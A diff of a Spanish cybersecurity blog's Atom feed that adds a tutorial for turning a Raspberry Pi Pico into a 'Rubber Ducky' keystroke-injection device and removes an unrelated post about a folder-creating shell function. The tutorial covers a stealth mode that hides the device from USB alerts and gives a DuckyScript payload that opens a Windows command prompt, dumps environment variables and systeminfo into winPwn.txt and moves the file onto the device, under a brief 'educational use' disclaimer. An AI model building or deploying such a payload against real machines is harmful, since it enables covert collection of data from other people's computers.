@@ -1,4 +1,232 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-12T15:03:17-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">HTB Devel</title><link href="http://localhost:4000/devel/" rel="alternate" type="text/html" title="HTB Devel" /><published>2022-10-12T00:00:00-05:00</published><updated>2022-10-12T00:00:00-05:00</updated><id>http://localhost:4000/devel</id><content type="html" xml:base="http://localhost:4000/devel/">&lt;p align=&quot;center&quot;&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2022-10-19T22:57:54-05:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Bast1ant1c</title><subtitle>Blog de Ciberseguridad</subtitle><author><name>BAST1ANT1C</name></author><entry><title type="html">Raspberry Ducky</title><link href="http://localhost:4000/raspberryducky/" rel="alternate" type="text/html" title="Raspberry Ducky" /><published>2022-10-19T00:00:00-05:00</published><updated>2022-10-19T00:00:00-05:00</updated><id>http://localhost:4000/raspberryducky</id><content type="html" xml:base="http://localhost:4000/raspberryducky/">&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/raspberryducky/00-ducky.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;¡Hola!
+Vamos a crear una Rubber Ducky a partir de una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Raspberry Pi Pico&lt;/code&gt; dejo un &lt;a href=&quot;https://www.amazon.com/s?k=raspberry+pi+pico&amp;amp;__mk_es_US=%C3%85M%C3%85%C5%BD%C3%95%C3%91&amp;amp;crid=3V38MFW16NGXP&amp;amp;sprefix=raspberry+pi+pic%2Caps%2C232&amp;amp;ref=nb_sb_noss_2&quot;&gt;link&lt;/a&gt; de búsqueda en amazon.&lt;/p&gt;
+
+&lt;p&gt;Una Rubber Ducky es un dispositivo &lt;strong&gt;malicioso&lt;/strong&gt; en forma de USB creado por &lt;a href=&quot;https://shop.hak5.org/products/usb-rubber-ducky&quot;&gt;Hack5&lt;/a&gt;, el cual, ejecuta comandos emulando un teclado en cuestión de segundos.&lt;/p&gt;
+
+&lt;h2 id=&quot;modos-de-uso-raspberry&quot;&gt;MODOS DE USO RASPBERRY&lt;/h2&gt;
+
+&lt;p&gt;No es obligatorio hacer uso de estos modos, sin embargo, vamos a mostrar el modo de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;configuración&lt;/code&gt; y modo de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sigilo&lt;/code&gt; que podemos obtener de nuestra Raspberry.&lt;/p&gt;
+
+&lt;h3 id=&quot;modo-configuracion&quot;&gt;MODO CONFIGURACION&lt;/h3&gt;
+
+&lt;p&gt;Como una buena práctica, vamos a hacer uso de este modo conectando el primer pin &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GP0&lt;/code&gt; y el pin 3 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GND&lt;/code&gt;, que evitará la inyección del payload a la misma maquina donde vamos a conectar el dispositivo, es decir, nuestra maquina local. Lo más recomendable es hacer un &lt;strong&gt;puente&lt;/strong&gt; entre estos pines con un cable de la siguiente manera.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/raspberryducky/01-pico.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h3 id=&quot;modo-sigilo&quot;&gt;MODO SIGILO&lt;/h3&gt;
+
+&lt;p&gt;El modo de sigilo es utilizado para que nuestro dispositivo no se muestre como un objeto de almacenamiento USB. Este modo funciona una vez la configuración y el payload se encuentren almacenados en la Raspberry, se procede a desconectar el dispositivo y realizar un puente entre los pines 18 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GND&lt;/code&gt; y 20 &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;GPIO15&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;De esta manera al conectar nuevamente la Raspberry no será generada una alerta de conectividad por USB.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/raspberryducky/02-pico.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h3 id=&quot;modo-de-fabrica&quot;&gt;MODO DE FABRICA&lt;/h3&gt;
+
+&lt;p&gt;Para restaurar a modo de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fabrica&lt;/code&gt; la Raspberry se debe mantener presionado el botón &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;BOOTSEL&lt;/code&gt; de color blanco en el momento de la conexión del dispositivo a la máquina.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/raspberryducky/03-pico.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;requisitos&quot;&gt;REQUISITOS&lt;/h2&gt;
+
+&lt;p&gt;Ahora que ya tenemos claros los modos de la Raspberry, vamos a conectar la Raspberry Pi Pico en modo de &lt;em&gt;fabrica&lt;/em&gt;, debe mostrarse el dispositivo como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RP1-RP2&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/raspberryducky/04-pico.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/raspberryducky/05-pico.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/raspberryducky/06-pico.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Procedemos a descargar las &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;librerías&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;repositorios&lt;/code&gt; necesarios para poder obtener nuestra Rubber Ducky en la Raspberry.&lt;/p&gt;
+
+&lt;h3 id=&quot;repositorio-git-de-dbisu&quot;&gt;REPOSITORIO GIT DE DBISU&lt;/h3&gt;
+
+&lt;p&gt;Este repositorio contiene toda la información, payload y scripts para preparar la Raspberry.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://github.com/dbisu/pico-ducky.git
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;circuitpython&quot;&gt;CIRCUITPYTHON&lt;/h3&gt;
+
+&lt;p&gt;Circuitpython nos permite ejecutar los comandos y cargar las librerías para que la Raspberry comprenda los scripts que ejecutaremos en nuestro payload, se recomienda instalar la última versión estable, en este caso &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;7.3.3&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://downloads.circuitpython.org/bin/raspberry_pi_pico/es/adafruit-circuitpython-raspberry_pi_pico-es-7.3.3.uf2
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Ahora procedemos a copiar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adafruit-circuitpython-raspberry_pi_pico-es-7.3.3.uf2&lt;/code&gt; en la raíz de la Raspberry &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RP1-RP2&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Lo que sucederá es que el dispositivo se va a desconectar y conectar automáticamente, con el nombre nuevo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CIRCUITPY&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/raspberryducky/07-pico.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/raspberryducky/08-pico.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h3 id=&quot;libreria-teclado&quot;&gt;LIBRERIA TECLADO&lt;/h3&gt;
+
+&lt;p&gt;La distribución de teclados es importante para la ejecución de comandos correctamente deseados.&lt;/p&gt;
+
+&lt;p&gt;Descargar la librería de la misma versión descargada de Circuitpython, en este caso 7.x.&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://github.com/adafruit/Adafruit_CircuitPython_Bundle/releases/download/20221019/adafruit-circuitpython-bundle-7.x-mpy-20221019.zip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Navegamos en la carpeta descomprimida y ubicamos las carpetas &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adafruit_hid&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;asyncio&lt;/code&gt;, de igual forma los archivos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adafruit_debouncer.mpy&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;adafruit_ticks.mpy&lt;/code&gt; en lib, procedemos a copiar todo en la carpeta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lib&lt;/code&gt; de la Raspberry &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CIRCUITPY&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/raspberryducky/09-pico.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Copiamos ahora del repositorio git descargado los archivos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;boot.py&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;duckyinpython.py&lt;/code&gt; en la raíz de la Raspberry &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CIRCUITPY&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/raspberryducky/10-pico.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Tenemos que realizar una modificación en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;duckyinpython.py&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#COMENTAR LAS SIGUIENTES LINEAS&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS as KeyboardLayout&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#from adafruit_hid.keycode import Keycode&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Guardamos el archivo y renombramos el mismo por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;code.py&lt;/code&gt;, sobrescribiendo el archivo existente.&lt;/p&gt;
+
+&lt;h4 id=&quot;teclado-español-latinoamerica&quot;&gt;TECLADO ESPAÑOL (LATINOAMERICA)&lt;/h4&gt;
+
+&lt;p&gt;Ingresamos a la página &lt;a href=&quot;https://www.neradoc.me/layouts/&quot;&gt;neradoc&lt;/a&gt; debido a que esta distribución no se encuentra por defecto en el programa.&lt;/p&gt;
+
+&lt;p&gt;Procedemos a ingresar la URL &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;https://kbdlayout.info/kbdla&lt;/code&gt; en el campo de texto y damos clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Make Zip Bundle Links&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Luego damos clic en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Download de zip file&lt;/code&gt; y descomprimimos el archivo.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/raspberryducky/11-pico.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Copiamos los archivos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keyboard_layout_win_la.py&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;keycode_win_la.py&lt;/code&gt; en el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;lib&lt;/code&gt; de la Raspberry &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CIRCUITPY&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/raspberryducky/12-pico.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#DESCOMENTAR Y MODIFICAR LAS SIGUIENTES LINEAS&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#ANTES&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#from keyboard_layout_win_LANG import KeyboardLayout&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#from keycode_win_LANG import Keycode&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;#DESPUES CON TECLADO LATINOAMERICA&lt;/span&gt;
+from keyboard_layout_win_la import KeyboardLayout
+from keycode_win_la import Keycode
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/raspberryducky/13-pico.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h4 id=&quot;teclado-español-españa&quot;&gt;TECLADO ESPAÑOL (ESPAÑA)&lt;/h4&gt;
+
+&lt;p&gt;No se requiere el proceso de Latinoamérica, únicamente modificar las líneas de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;duckyinpython.py&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#DESCOMENTAR Y MODIFICAR LAS SIGUIENTES LINEAS&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#ANTES&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#from keyboard_layout_win_LANG import KeyboardLayout&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;#from keycode_win_LANG import Keycode&lt;/span&gt;
+
+&lt;span class=&quot;c&quot;&gt;#DESPUES CON TECLADO ESPAÑOL ESPAÑA&lt;/span&gt;
+from keyboard_layout_win_es import KeyboardLayout
+from keycode_win_es import Keycode
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Guardamos el archivo y renombramos el mismo por &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;code.py&lt;/code&gt;, sobrescribiendo el archivo existente.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/raspberryducky/14-pico.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;payloads&quot;&gt;PAYLOADS&lt;/h2&gt;
+
+&lt;p&gt;En el siguiente enlace se encuentran diferentes &lt;a href=&quot;https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads&quot;&gt;scripts&lt;/a&gt; predefinidos que se han generado anteriormente.&lt;/p&gt;
+
+&lt;p&gt;En este enlace es posible crear tus propios &lt;a href=&quot;https://ducktoolkit.com/encode&quot;&gt;Payloads&lt;/a&gt;, incluso en el mismo bloc de notas puedes programar tus scripts.&lt;/p&gt;
+
+&lt;p&gt;Si quieres más información para entender este lenguaje, es bastante cómodo y en este enlace tienes la &lt;a href=&quot;https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Duckyscript&quot;&gt;información&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;Por mi parte les dejo un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;script&lt;/code&gt; para almacenar información general de un dispositivo en nuestro dispositivo, este script debe ser guardado en el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;payload.dd&lt;/code&gt;&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;DELAY 3500
+GUI r
+DELAY 200
+STRING cmd
+ENTER
+DELAY 500
+STRING &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Obteniendo datos del sistema ... &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; winPwn.txt
+ENTER
+DELAY 200
+STRING &lt;span class=&quot;nb&quot;&gt;set&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; winPwn.txt
+ENTER
+STRING cls
+ENTER
+DELAY 200
+STRING &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Obteniendo informacion adicional ... &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; winPwn.txt
+ENTER
+DELAY 200
+STRING systeminfo &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; winPwn.txt
+ENTER
+DELAY 800
+STRING cls
+ENTER
+STRING &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Informacion capturada con exito! &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; winPwn.txt
+ENTER
+DELAY 200
+STRING move winPwn.txt D:&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;inPwn.txt
+ENTER
+DELAY 300
+STRING &lt;span class=&quot;nb&quot;&gt;exit
+&lt;/span&gt;ENTER
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Finalmente desconectamos la Raspberry y ya está lista para el uso que deseamos, al conectarla en un dispositivo siempre y cuando todo este correcto, en este caso obtenemos la información de un dispositivo almacenado en nuestro dispositivo.&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/raspberryducky/15-pico.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&quot;recomendacion&quot;&gt;RECOMENDACION&lt;/h2&gt;
+
+&lt;p&gt;Debes tener en cuenta que en el momento en que tengas el script configurado en el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;payload.dd&lt;/code&gt;, si la Raspberry no se encuentra en modo de configuración, se reiniciara y automaticamente hace la ejecucion del script definido anteriormente.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;La información de este artículo es de uso educativo, úsalo con responsabilidad.&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;¡Hemos logrado nuestra primera rubber ducky con Raspberry en el blog!&lt;/p&gt;
+
+&lt;p align=&quot;center&quot;&gt;
+&lt;img src=&quot;/assets/images/raspberryducky/16-pico.png&quot; /&gt;
+&lt;/p&gt;
+
+&lt;p&gt;Son libres de hacerle las modificaciones que necesiten a sus scripts, es todo un mundo que queda por explorar con este dispositivo, es una ventaja que podamos crear nuestras propias herramientas para mejorar nuestra calidad de aprendizaje.&lt;/p&gt;
+
+&lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>Bast1ant1c</name></author><category term="Raspberry" /><category term="Ducky" /><summary type="html">Vamos a crear una Rubber Ducky a partir de una Raspberry Pi Pico. ¡Let's hack!</summary></entry><entry><title type="html">HTB Devel</title><link href="http://localhost:4000/devel/" rel="alternate" type="text/html" title="HTB Devel" /><published>2022-10-12T00:00:00-05:00</published><updated>2022-10-12T00:00:00-05:00</updated><id>http://localhost:4000/devel</id><content type="html" xml:base="http://localhost:4000/devel/">&lt;p align=&quot;center&quot;&gt;
 &lt;img src=&quot;/assets/images/devel/02-tarjeta.png&quot; /&gt;
 &lt;/p&gt;
 
@@ -2507,79 +2735,4 @@ find / &lt;span class=&quot;nt&quot;&gt;-name&lt;/span&gt; key-&lt;span class=&q
 
 &lt;p&gt;&lt;em&gt;¡Que tengan un buen día en el planeta donde se encuentren!&lt;/em&gt;&lt;/p&gt;
 
-&lt;p&gt;&lt;strong&gt;Nos vemos en otro bit.&lt;/strong&gt;&lt;/p&gt;</content><author><name>Bast1ant1c</name></author><category term="Writeup" /><category term="MrRobot" /><summary type="html">Vamos a resolver la maquina Mr. Robot de TryHackMe. ¡Let's hack!</summary></entry><entry><title type="html">mkhack</title><link href="http://localhost:4000/mkhack/" rel="alternate" type="text/html" title="mkhack" /><published>2022-05-31T00:00:00-05:00</published><updated>2022-05-31T00:00:00-05:00</updated><id>http://localhost:4000/mkhack</id><content type="html" xml:base="http://localhost:4000/mkhack/">&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/mkhack/prueba.png&quot; /&gt;
-&lt;/p&gt;
-
-&lt;p&gt;¡Hola!
-En esta ocasión vamos a crear la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkhack&lt;/code&gt; para organizar nuestros ficheros al momento de realizar nuestras maquinas.
-Les compartiré algo sencillo, pero bastante útil, esta función la estaré utilizando en los próximos posts, por eso quiero mostrar el origen de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkhack&lt;/code&gt;.&lt;/p&gt;
-
-&lt;h2 id=&quot;la-función&quot;&gt;LA FUNCIÓN&lt;/h2&gt;
-
-&lt;p&gt;No hay mucho que decir, el objetivo es crear un directorio &lt;strong&gt;principal&lt;/strong&gt;, el cual a su vez tiene &lt;strong&gt;subdirectorios&lt;/strong&gt; que ayudaran a la organización de nuestra resolución de máquinas o proyectos que podamos tener.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;mkhack &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
-        &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;recon,exploit&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;Vamos paso a paso:&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkhack&lt;/code&gt; = Nombre de la función&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkdir&lt;/code&gt; = Comando para crear carpetas&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;-p&lt;/code&gt; = Crea un directorio principal (padre)&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$1&lt;/code&gt; = Argumento #1 (nombre del directorio principal)&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/{recon,exploit}&lt;/code&gt; = Subdirectorios (hijos)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;como-se-utiliza&quot;&gt;¿COMO SE UTILIZA?&lt;/h2&gt;
-
-&lt;p&gt;Ya tenemos el codigo, ahora en qué lugar hay que guardar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;mkhack&lt;/code&gt; para poder utilizarlo como si fuera un &lt;strong&gt;ls&lt;/strong&gt;, &lt;strong&gt;cd&lt;/strong&gt;, &lt;strong&gt;mv&lt;/strong&gt;, etc…&lt;/p&gt;
-
-&lt;p&gt;Solo hay una pregunta para hacer. 
-¿Cuál es nuestro actual tipo de &lt;strong&gt;&lt;em&gt;shell&lt;/em&gt;&lt;/strong&gt;?
-En mi caso es una &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;zsh&lt;/code&gt;, pero podemos saber cuál es la nuestra con el siguiente comando.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$SHELL&lt;/span&gt;
-/usr/bin/zsh
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ahora que lo sabemos vamos a editar (&lt;strong&gt;vim&lt;/strong&gt;, &lt;strong&gt;nvim&lt;/strong&gt;, &lt;strong&gt;nano&lt;/strong&gt;, etc.) nuestro archivo de configuración de la shell, para mi caso es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.zshrc&lt;/code&gt;.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯  &lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt;
-❯ vim .zshrc
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Podremos ver la configuración de nuestra shell, es en este lugar, donde nos situamos en la última línea e ingresamos nuestra función de la siguiente manera.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;# Función para crear directorio y subdirectorios&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;mkhack&lt;span class=&quot;o&quot;&gt;(){&lt;/span&gt;
-        &lt;span class=&quot;nb&quot;&gt;mkdir&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;$1&lt;/span&gt;/&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;recon,exploit&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Luego de esto guardamos los cambios y es necesario cerrar sesión o incluso reiniciar nuestra máquina.&lt;/p&gt;
-
-&lt;h2 id=&quot;mkhack-en-acción&quot;&gt;MKHACK EN ACCIÓN&lt;/h2&gt;
-
-&lt;p&gt;¡Ahora podemos poner en marcha nuestra nueva función!
-Lo único que necesitamos en este momento es ubicarnos en donde queremos los directorios y nada más.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ mkhack directorioHack
-❯ &lt;span class=&quot;nb&quot;&gt;ls &lt;/span&gt;directorioHack/
- exploit   recon
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Hemos creado el directorio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;directorioHack&lt;/code&gt; y a su vez los subdirectorios &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exploit&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;recon&lt;/code&gt; para poder iniciar nuestra metodología al resolver una máquina.
-¡Hemos logrado nuestra primera función en el blog!&lt;/p&gt;
-
-&lt;p align=&quot;center&quot;&gt;
-&lt;img src=&quot;/assets/images/mkhack/01final.png&quot; /&gt;
-&lt;/p&gt;
